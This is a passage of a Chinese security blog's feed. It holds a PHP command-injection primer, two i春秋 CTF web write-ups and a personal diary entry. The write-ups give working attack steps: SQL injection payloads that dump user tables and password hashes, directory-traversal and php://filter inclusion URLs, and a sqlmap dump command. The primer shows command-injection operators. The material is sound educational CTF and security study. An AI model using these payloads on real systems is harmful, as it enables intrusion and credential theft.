    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在 PHP 中, <code>exec()</code>、<code>system()</code>、<code>popen()</code>、<code>passthru()</code>、<code>proc_open()</code>、<code>pcntl_exec()</code>、<code>shell_exec()</code>，还有反引号 ``包裹的内容，都可以用来执行系统命令。</p><p>如果执行的命令参数是用户可控的，那么就会造成命令执行漏洞。</p><p>下面是常见的函数描述：</p><ul><li><p>system()</p><p>  输出并返回最后一行shell结果。 </p></li><li><p>exec()</p><p>  不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。</p></li><li><p>passthru()</p><p>  只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。</p></li><li><p>popen()、proc_open()</p><p>  不会直接返回执行结果，而是返回一个文件指针。</p></li><li><p>反引号</p><p>  调用 <code>shell_exec()</code> 函数</p></li></ul><a id="more"></a><hr><h2 id="各平台的漏洞利用"><a href="#各平台的漏洞利用" class="headerlink" title="各平台的漏洞利用"></a>各平台的漏洞利用</h2><p>在实际场景中，要利用命令执行漏洞，通常需要借助管道符，拼接到正常的命令参数中来实现。</p><p>各个平台支持的管道符都有所不同，下面是 <code>Windows</code> 及 <code>Linux</code> 支持的管道符。</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul><li><p>|</p><p>  直接执行后面的语句。</p><blockquote><p>ping | whoami</p></blockquote></li><li><p>||</p><p>  如果前面的语句执行出错，则执行后面的语句。</p><blockquote><p>p || whoami</p></blockquote></li><li><p>\&amp;</p><p>  如果前面的语句为假，直接执行后面的语句。</p><p>  为真，也会执行后面的语句。</p><blockquote><p>ping 127.0.0.1 &amp; whoami</p></blockquote></li><li><p>\&amp;\&amp;</p><p>  如果前面的语句为假直接出错，不会执行后面的。前面的语句必须为真。</p><blockquote><p>ping 127.0.0.1 &amp;&amp; whoami</p></blockquote></li></ul><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul><li><p>\;</p><p>  执行完前面的语句，再执行后面的。</p><blockquote><p>ping 127.0.0.1;whoami</p></blockquote></li><li><p>|</p><p>  直接执行后面的语句。</p><blockquote><p>ping | whoami</p></blockquote></li><li><p>||</p><p>  如果前面的语句执行出错，则执行后面的语句。</p><blockquote><p>p || whoami</p></blockquote></li><li><p>\&amp;</p><p>  如果前面的语句为假，直接执行后面的语句。</p><p>  为真，也会执行后面的语句。</p><blockquote><p>ping 127.0.0.1 &amp; whoami</p></blockquote></li><li><p>\&amp;\&amp;</p><p>  如果前面的语句为假直接出错，不会执行后面的。前面的语句必须为真。</p><blockquote><p>ping 127.0.0.1 &amp;&amp; whoami</p></blockquote></li></ul><hr><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>PHP 内置了两个函数，<code>escapeshellarg()</code>，<code>escapeshellcmd()</code>可以防止命令执行。</p><ol><li><p>escapeshellarg()</p><p> 把字符串转码为可以在 shell 命令里使用的参数。</p></li><li><p>escapeshellcmd()</p><p> shell 元字符转义。</p><p> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <code>exec()</code> 或 <code>system()</code> 函数，或者 执行操作符 之前进行转义。</p><p> 反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在 PHP 中, &lt;code&gt;exec()&lt;/code&gt;、&lt;code&gt;system()&lt;/code&gt;、&lt;code&gt;popen()&lt;/code&gt;、&lt;code&gt;passthru()&lt;/code&gt;、&lt;code&gt;proc_open()&lt;/code&gt;、&lt;code&gt;pcntl_exec()&lt;/code&gt;、&lt;code&gt;shell_exec()&lt;/code&gt;，还有反引号 ``包裹的内容，都可以用来执行系统命令。&lt;/p&gt;
&lt;p&gt;如果执行的命令参数是用户可控的，那么就会造成命令执行漏洞。&lt;/p&gt;
&lt;p&gt;下面是常见的函数描述：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;system()&lt;/p&gt;
&lt;p&gt;  输出并返回最后一行shell结果。 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;exec()&lt;/p&gt;
&lt;p&gt;  不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;passthru()&lt;/p&gt;
&lt;p&gt;  只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;popen()、proc_open()&lt;/p&gt;
&lt;p&gt;  不会直接返回执行结果，而是返回一个文件指针。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;反引号&lt;/p&gt;
&lt;p&gt;  调用 &lt;code&gt;shell_exec()&lt;/code&gt; 函数&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
    
      <category term="Web" scheme="https://jayl1n.github.io/tags/Web/"/>
    
      <category term="PHP" scheme="https://jayl1n.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>i春秋-Web-BLOG</title>
    <link href="https://jayl1n.github.io/2018/09/11/ichunqiu-web-BLOG/"/>
    <id>https://jayl1n.github.io/2018/09/11/ichunqiu-web-BLOG/</id>
    <published>2018-09-11T09:37:52.000Z</published>
    <updated>2019-08-19T14:29:15.817Z</updated>
    
    <content type="html"><![CDATA[<p>一个BLOG，注册后登录，发现使用了 <code>kindeditor 4.1.10</code> 编辑器，这个编辑器存在目录遍历漏洞，访问 <code>/kindeditor/php/file_manager_json.php?path=../</code>，会泄露目录内文件。</p><a id="more"></a><p><img src="/2018/09/11/ichunqiu-web-BLOG/kindeditor.png" alt="kindeditor"></p><p>发现 <code>flag</code> 就在网站根目录下，但是没办法访问到。</p><p>继续摸索，有个发文章的功能，存在SQL注入，INSERT型。</p><p>通过INSERT可以批量添加记录的特性，判断出当前表存在4个字段。</p><p>Payload:</p><blockquote><p>title=1&amp;content=1’,’1’),(‘aaa’,’bbb’,’ccc’) # 报错<br>title=1&amp;content=1’,’1’),(‘aaa’,’bbb’,’ccc’,’ddd’) # 成功</p></blockquote><p>根据回显，得出第二个字段是标题，第三个字段是内容。</p><p>开始爆数据：</p><ul><li><p>爆表名</p><blockquote><p>title=1&amp;content=1’,’1’),(‘aaa’,(select group_concat(table_name) from information_schema.tables where table_schema = database()),’ccc’,’ddd’) # 得到表 [posts,users]</p></blockquote></li><li><p>爆字段</p><blockquote><p>title=1&amp;content=1’,’1’),(‘aaa’,(select table_name, column_name from information_schema.columns where table_name = ‘users’ # 得到两个字段 [username,password]</p></blockquote></li><li><p>爆用户</p><blockquote><p>title=1&amp;content=1’,’1’),(‘aaa’,(select group_concat(username) from users ),’ccc’,’ddd’) # 得到用户名 admin </p></blockquote></li><li><p>爆密码</p><blockquote><p>title=1&amp;content=1’,’1’),(‘aaa’,(select group_concat(password) from users ),’ccc’,’ddd’) # 得到密码HASH dbb616c5d935d8f34c12c291066d6fb7，解密后 melody123</p></blockquote></li></ul><p>重新以 <code>admin</code> 身份登录，发现新的入口 <code>/blog_manage/manager.php?module=article_manage&amp;name=php</code>，看链接，长得就像文件包含漏洞。</p><p>测试后，发现确实是这个问题。</p><p>构造链接， <code>/blog_manage/manager.php?module=php://filter/read=convert.base64-encode/resource=../flag&amp;name=php</code>，成功读到 <code>flag</code>。</p><p><img src="/2018/09/11/ichunqiu-web-BLOG/flag.png" alt="flag"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一个BLOG，注册后登录，发现使用了 &lt;code&gt;kindeditor 4.1.10&lt;/code&gt; 编辑器，这个编辑器存在目录遍历漏洞，访问 &lt;code&gt;/kindeditor/php/file_manager_json.php?path=../&lt;/code&gt;，会泄露目录内文件。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Web" scheme="https://jayl1n.github.io/tags/Web/"/>
    
      <category term="i春秋" scheme="https://jayl1n.github.io/tags/i%E6%98%A5%E7%A7%8B/"/>
    
      <category term="BLOG" scheme="https://jayl1n.github.io/tags/BLOG/"/>
    
  </entry>
  
  <entry>
    <title>i春秋-Web-SQLi</title>
    <link href="https://jayl1n.github.io/2018/09/10/ichunqiu-web-SQLi/"/>
    <id>https://jayl1n.github.io/2018/09/10/ichunqiu-web-SQLi/</id>
    <published>2018-09-10T05:30:38.000Z</published>
    <updated>2019-08-19T14:29:15.820Z</updated>
    
    <content type="html"><![CDATA[<p>一道注入题，登录页面。</p><p>试了常见的万能密码，无效，不存在弱口令。</p><p>使用BP，看下过滤了哪些字符。</p><a id="more"></a><p><img src="/2018/09/10/ichunqiu-web-SQLi/bp-1.png" alt="BP-1"></p><p>发现参数含有<code>%</code>时，报错。</p><p><img src="/2018/09/10/ichunqiu-web-SQLi/sqli-1.png" alt="SQLi-1"></p><p>提示 <code>Warning: sprintf(): Too few arguments in /var/www/html/index.php on line 18</code>，根据提示，判定可能存在<code>sprintf格式化字符串漏洞</code>。</p><p>看下<code>sprintf</code>函数的描述。</p><p><img src="/2018/09/10/ichunqiu-web-SQLi/info-1.png" alt="Info-1"></p><p>可以构造payload:<code>admin %1$&#39; or 1=1 #</code>，顶掉占位符，注入sql语句。此处，提示<code>password error!</code></p><p>此处不回显内容，但是有错误提示，只能盲注。</p><p>可以直接用<code>sqlmap</code>跑出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://b968f913d88e4ce5b916d5f6a2badf2e4568f7626bc84863.game.ichunqiu.com/&quot; --data &quot;username=admin%1$&apos; * #&amp;password=12345&quot; --no-cast -p username --level 3 -T B -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure><p><img src="/2018/09/10/ichunqiu-web-SQLi/sqli-2.png" alt="SQLi-2"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.colabug.com/4099484.html" target="_blank" rel="noopener">php中利用格式化字符串漏洞绕过addslashes注入</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一道注入题，登录页面。&lt;/p&gt;
&lt;p&gt;试了常见的万能密码，无效，不存在弱口令。&lt;/p&gt;
&lt;p&gt;使用BP，看下过滤了哪些字符。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Web" scheme="https://jayl1n.github.io/tags/Web/"/>
    
      <category term="SQLi" scheme="https://jayl1n.github.io/tags/SQLi/"/>
    
      <category term="i春秋" scheme="https://jayl1n.github.io/tags/i%E6%98%A5%E7%A7%8B/"/>
    
  </entry>
  
  <entry>
    <title>日常心路-180909</title>
    <link href="https://jayl1n.github.io/2018/09/09/daily-life-20180909/"/>
    <id>https://jayl1n.github.io/2018/09/09/daily-life-20180909/</id>
    <published>2018-09-09T15:14:15.000Z</published>
    <updated>2019-08-19T14:29:15.815Z</updated>
    
    <content type="html"><![CDATA[<p>最近忙了很多事，从公司离职，搬家，开学，又跑到某市做培训。</p><p>突然回到校园生活，身份从社会人变成学生，感觉还有点不适应。</p><p>今天，如愿以偿的通过了<code>Syclover</code>的面试，进入了新芽组，应该是唯一一个大三的新芽 ( ╯□╰ )，不过也算是完成了高中时候的心愿（进入CUIT，进入Syclover）。今天面的师傅很严肃，感觉自己确实还差的太多了，希望能在这个学期努力跟上。</p><p>这个学期，需要额外补<code>3</code>门课，把四级过了，还要尽量通过核心组面试，任务挺重的⊙﹏⊙∥。</p><p>诸君共勉吧(ﾉ*･ω･)ﾉ。</p><p><img src="/2018/09/09/daily-life-20180909/jldnydhgjxzpmdzj.jpg" alt="表情"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近忙了很多事，从公司离职，搬家，开学，又跑到某市做培训。&lt;/p&gt;
&lt;p&gt;突然回到校园生活，身份从社会人变成学生，感觉还有点不适应。&lt;/p&gt;
&lt;p&gt;今天，如愿以偿的通过了&lt;code&gt;Syclover&lt;/code&gt;的面试，进入了新芽组，应该是唯一一个大三的新芽 ( ╯□╰ )
      
    
    </summary>
    
    
    
      <category term="日常" scheme="https://jayl1n.github.io/tags/%E6%97%A5%E5%B8%B8/"/>
    
      <category term="心路" scheme="https://jayl1n.github.io/tags/%E5%BF%83%E8%B7%AF/"/>
    
  </entry>
  
</feed>
